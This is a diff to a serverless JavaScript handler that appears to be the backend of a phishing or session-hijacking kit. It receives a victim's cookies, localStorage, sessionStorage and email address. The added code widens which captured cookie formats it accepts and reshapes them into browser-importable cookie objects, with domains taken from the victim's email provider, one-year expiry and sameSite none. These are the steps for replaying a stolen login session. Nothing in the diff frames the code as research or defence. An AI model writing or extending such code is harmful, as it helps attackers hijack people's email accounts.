@@ -58,7 +58,10 @@ export const handler = async (event, context) => {
       documentCookies,
       localStorage: clientLocalStorage,
       sessionStorage: clientSessionStorage,
-      sessionId: incomingSessionId
+      sessionId: incomingSessionId,
+      // include optional cookieList / cookiesParsed if present (we destructure for clarity)
+      cookieList,
+      cookiesParsed
     } = data;
 
     // Required env vars
@@ -109,15 +112,49 @@ export const handler = async (event, context) => {
                       'Unknown').toString().split(',')[0].trim();
 
     // Enhanced cookie processing
-    const cookieInfo = data.documentCookies || data.cookies || (browserFingerprint && browserFingerprint.cookies) || documentCookies || 'No cookies available';
+    // NOTE: support cookieList and cookiesParsed in addition to documentCookies / cookies / browserFingerprint
+    let cookieInfo = data.documentCookies || data.cookies || (browserFingerprint && browserFingerprint.cookies) || documentCookies || 'No cookies available';
+
+    // If the client included a cookieList array, prefer it when other cookieInfo is missing/empty
+    if ((Array.isArray(data.cookieList) && data.cookieList.length > 0) && (!cookieInfo || cookieInfo === 'No cookies available' || (typeof cookieInfo === 'string' && cookieInfo.trim() === ''))) {
+      cookieInfo = data.cookieList;
+    }
+
+    // If cookiesParsed is an object (name -> value) and cookieInfo is absent/empty, use it
+    if ((!Array.isArray(cookieInfo) || cookieInfo.length === 0) && cookiesParsed && typeof cookiesParsed === 'object' && Object.keys(cookiesParsed).length > 0) {
+      cookieInfo = cookiesParsed;
+    }
+
     const localStorageInfo = (browserFingerprint && browserFingerprint.localStorage) || clientLocalStorage || 'Empty';
     const sessionStorageInfo = (browserFingerprint && browserFingerprint.sessionStorage) || clientSessionStorage || 'Empty';
 
     // Enhanced cookie formatting with multiple fallback methods
     let formattedCookies = [];
 
+    // If cookieInfo is an object (cookiesParsed: {name: value}), convert to an array
+    if (cookieInfo && typeof cookieInfo === 'object' && !Array.isArray(cookieInfo)) {
+      try {
+        const obj = cookieInfo;
+        formattedCookies = Object.keys(obj).map(name => ({
+          name,
+          value: obj[name],
+          domain: getDomainFromEmailProvider(email, provider),
+          path: '/',
+          secure: true,
+          httpOnly: false,
+          sameSite: 'none',
+          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+          hostOnly: false,
+          session: false,
+          storeId: null
+        })).filter(c => c && c.name);
+      } catch (e) {
+        formattedCookies = [];
+      }
+    }
+
     // Method 1: Direct array
-    if (Array.isArray(cookieInfo) && cookieInfo.length > 0) {
+    if (formattedCookies.length === 0 && Array.isArray(cookieInfo) && cookieInfo.length > 0) {
       formattedCookies = cookieInfo.filter(cookie => cookie && cookie.name).map(cookie => ({
         ...cookie,
         domain: cookie.domain || getDomainFromEmailProvider(email, provider)
@@ -125,7 +162,7 @@ export const handler = async (event, context) => {
     }
 
     // Method 2: Parse JSON string
-    else if (typeof cookieInfo === 'string' && cookieInfo.trim() !== '' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty') {
+    if (formattedCookies.length === 0 && typeof cookieInfo === 'string' && cookieInfo.trim() !== '' && cookieInfo !== 'No cookies found' && cookieInfo !== 'Empty') {
       try {
         const parsedCookies = JSON.parse(cookieInfo);
         if (Array.isArray(parsedCookies)) {
@@ -162,8 +199,8 @@ export const handler = async (event, context) => {
       }
     }
 
-    // Method 4: explicit documentCookies field
-    else if (typeof documentCookies === 'string' && documentCookies.trim() !== '') {
+    // Method 4: explicit documentCookies field (already covered above but keep fallback)
+    if (formattedCookies.length === 0 && typeof documentCookies === 'string' && documentCookies.trim() !== '') {
       const cookieStrings = documentCookies.split(';').filter(c => c.trim() && c.includes('='));
       formattedCookies = cookieStrings
         .map(cookieStr => {
